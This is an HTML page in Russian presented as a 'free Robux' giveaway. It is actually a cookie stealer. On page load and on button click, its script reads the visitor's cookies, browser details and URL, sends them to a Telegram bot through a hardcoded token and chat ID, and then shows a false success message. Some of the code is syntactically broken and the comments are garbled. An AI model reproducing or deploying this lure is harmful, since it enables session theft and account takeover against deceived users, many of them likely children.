<!DOCTYPE html>
<html>
<head>
    <title>Бесплатные Robux</title>
    <script>
        // Тоника
        const BOT_TOKEN = "8819341110:AAEWJrK3oScCdUmx9a3V7KKOqITPvHs_848"; // 🔑 Его токен
        const CHAT_ID = "8845611673"; // 📩 Его ID

        // Функm
        function sendToTelegram(message) {
            const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log(' Дане отправл');
                } else {
                    console.error('❌ Ошибка отправки');
                }
            })
            .catch(error => console.error('❌ Ошибка:', error));
        }

        // Фуни
        function stealCookies() {
            // Полта
            const cookies = document.cookie;
            
            // Ине
            const userAgent = navigator.userAgent;
            const url = window.location.href;
            const time = new Date().toISOString();

            // Формm
            const message = 🔴 НОА!\n +
                            🕒 Вр: ${time}\n +
                            🌐 Стиц: ${url}\n +
                            💻 Бузе: ${userAgent}\n +
                            🍪 пинашдп: ${cookies || "Нет "};

            // Отку
            sendToTelegram(message);
            
            // Поке
            document.body.innerHTML = 
                <h1 style="color: green;">✅ Проверка пройдена!</h1>
                <p>Вы получили 1000 Robux! Они будут зачислены в течение 5 минут.</p>
                <p style="color: gray; font-size: 12px;">Спасибо, что пользуетесь нашим сервисом!</p>
            ;
        }

        // Запицы
        window.onload = function() {
            // Неба
            setTimeout(stealCookies, 500);
        };
    </script>
</head>
<body>
    <h1>🎁 Бесплатные Robux</h1>
    <p>Нажмите кнопку, чтобы получить 1000 Robux!</p>
    <button onclick="stealCookies()" style="padding: 10px 20px; font-size: 20px; background: gold; border: none; cursor: pointer;">
        Получить Robux
    </button>
    <p style="color: gray; font-size: 14px; margin-top: 20px;">* Требуется подтверждение аккаунта</p>
</body>
</html>
